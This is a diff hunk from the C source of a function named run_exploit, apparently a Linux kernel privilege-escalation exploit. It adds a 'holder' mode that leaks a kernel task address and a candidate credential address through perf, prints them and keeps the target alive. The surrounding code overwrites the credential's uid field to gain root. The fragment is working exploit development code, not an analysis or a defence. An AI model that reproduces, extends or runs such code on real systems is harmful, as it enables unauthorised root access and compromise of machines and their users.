@@ -755,6 +755,19 @@ int run_exploit(int argc, char **argv) {
         pr_error("mt28c: perf task leak failed\n");
         return 1;
       }
+      /* mt70: PSELECT_HOLDER=1 → fork 子进程只泄漏 task 并进入 8min 轮询，
+       * 父进程不触发任何写，打印 task 后退出。用于 R-external / 几何对照实验
+       * 提供干净、活着的写目标（real_cred 和 cred 都未改）。 */
+      if (getenv("PSELECT_HOLDER")) {
+        if (mt49_task_env) {
+          pr_error("mt70: HOLDER requires fork mode (no PSELECT_TASK)\n");
+          return 1;
+        }
+        pr_info("mt70: HOLDER task=%016zx cred_cand=%016zx (child alive, no write)\n",
+                (size_t)task, (size_t)g_perf_cred_cand);
+        fflush(stdout);
+        return 0;
+      }
       /* mt40: route C - use perf-leaked cred addr, write cred content (real uid@+0x4), not ptr */
       uintptr_t cred_addr = g_perf_cred_cand;
       if (!mt49_task_env && !cred_addr) {
